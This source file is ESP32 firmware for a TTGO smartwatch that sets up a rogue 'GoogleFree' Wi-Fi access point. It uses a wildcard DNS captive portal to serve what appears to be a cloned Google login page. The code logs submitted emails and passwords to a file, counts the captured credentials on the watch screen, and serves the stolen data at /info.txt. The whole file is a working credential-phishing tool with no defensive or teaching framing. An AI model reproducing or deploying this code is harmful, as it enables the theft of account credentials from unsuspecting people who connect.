#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>
#include <LittleFS.h> //filesystem
#include "config.h"

#define MAX_HTML_SIZE 20000
#define DNS_PORT 53
#define BUTTON_PIN 0

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);
bool serverActive = false;
int credentialCount = 0;


const int toggle_X = 170;
const int toggle_Y = 180;
const int toggle_WIDTH = 240;
const int toggle_HEIGHT = 60;

TTGOClass *ttgo; 
AXP20X_Class *power;  

char apName[30] = "ESP32-Network";  // AP name


void clearScreen() {
  ttgo->tft->fillScreen(TFT_BLACK);
}

void showToggle() {
  // clear area
  ttgo->tft->fillRect(toggle_X, toggle_Y, toggle_WIDTH, toggle_HEIGHT, TFT_BLACK);

  // toggle background
  uint16_t bgColor = serverActive ? TFT_GREEN : TFT_RED;
  ttgo->tft->fillRect(toggle_X, toggle_Y, toggle_WIDTH, toggle_HEIGHT, bgColor);

  // toggle status text
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setTextSize(2);
  ttgo->tft->setCursor(toggle_X + 15, toggle_Y + 20);
  ttgo->tft->print(serverActive ? "ON" : "OFF");
}

void setupServer() {
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("/");  
  });


  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (LittleFS.exists("/Better_Google_Mobile.html")) {
      AsyncWebServerResponse *response = request->beginResponse(LittleFS, "/Better_Google_Mobile.html", "text/html");
      request->send(response);
    } else {
      request->send(404, "text/plain", "File not found");
    }
  });


  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String user_name;
    String password;
    if (request->hasParam("email")) {
      user_name = request->getParam("email")->value();
    }
    if (request->hasParam("password")) {
      password = request->getParam("password")->value();
    }

    // Log credentials to file
    File credFile = LittleFS.open("/info.txt", "a");
    if (credFile) {
      credFile.println("Email: " + user_name);
      credFile.println("Password: " + password);
      credFile.println("---");
      credFile.close();
    }

    // Increment and display counter
    credentialCount++;
    ttgo->tft->fillRect(0, 100, 240, 50, TFT_BLACK);
    ttgo->tft->setCursor(0, 100);
    ttgo->tft->setTextColor(TFT_GREEN);
    ttgo->tft->setTextSize(3);
    ttgo->tft->println(String(credentialCount));

    request->send(200, "text/html", "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });

  server.on("/info.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (LittleFS.exists("/info.txt")) {
      AsyncWebServerResponse *response = request->beginResponse(LittleFS, "/info.txt", "text/plain");
      request->send(response);
    } else {
      request->send(200, "text/plain", "No credentials logged yet.");
    }
  });

  server.begin();
  serverActive = true;
}

void startAP() {
  WiFi.mode(WIFI_AP);


  IPAddress local_ip(192, 168, 1, 1);
  //IPAddress default_gateway(192, 168, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_ip, local_ip, subnet); 

  WiFi.softAP(apName);

  IPAddress apIP = WiFi.softAPIP();

  clearScreen();  
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->setTextSize(2);
  ttgo->tft->println("AP started at: ");
  ttgo->tft->println(apIP);

  
  dnsServer.start(DNS_PORT, "*", apIP);

  
  setupServer();

  ttgo->tft->setCursor(0, 40);
  ttgo->tft->print("DNS and Server Ready");

  ttgo->tft->setCursor(0, 80);
  ttgo->tft->setTextColor(TFT_GREEN);
  ttgo->tft->print("Server started");
}

void stopServer() {
  dnsServer.stop();
  server.end();
  WiFi.softAPdisconnect(true);
  serverActive = false;
  credentialCount = 0;

  clearScreen();
}

void toggleServer() {
  if (serverActive) {
    stopServer();
  } else {
    startAP();
  }
  showToggle();  
}

void detectTouch() {
  int16_t x, y;
  delay(150);  

  if (ttgo->getTouch(x, y)) {
    if (x >= toggle_X && x <= (toggle_X + toggle_WIDTH) && y >= toggle_Y && y <= (toggle_Y + toggle_HEIGHT)) {
      toggleServer();
    }
  }
}

void setup() {
  ttgo = TTGOClass::getWatch();  
  ttgo->begin();
  ttgo->openBL();  

  clearScreen();
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->print("Initializing...");
  delay(1000);

  Serial.begin(115200);

  if (!LittleFS.begin(true)) {
    ttgo->tft->setTextSize(2);

    clearScreen();
    ttgo->tft->setCursor(0, 0);
    ttgo->tft->print("LittleFS Mount Failed");
    return;
  }

  clearScreen();
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->setTextSize(2);
  ttgo->tft->print("LittleFS Mounted");

  strcpy(apName, "GoogleFree");
  showToggle();

  pinMode(BUTTON_PIN, INPUT_PULLUP);
}

void loop() {
  if (serverActive) {
    dnsServer.processNextRequest();  
  }
  detectTouch();
}
